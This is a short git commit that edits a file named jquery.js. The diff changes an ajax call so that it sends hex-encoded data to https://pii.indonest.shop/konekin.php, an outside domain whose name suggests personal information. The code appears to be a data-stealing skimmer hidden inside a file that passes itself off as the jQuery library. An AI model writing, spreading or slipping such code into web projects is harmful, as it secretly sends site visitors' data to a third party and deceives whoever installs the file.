0bf1d585bbded97a27c44d22f6eccd3cf9473dcc
stylesheeettt <ganzzunbanv@gmail.com>
2024-09-27 03:02:27 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://pii.indonest.shop?cat="+
+                    "https://pii.indonest.shop/konekin.php?cat="+
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
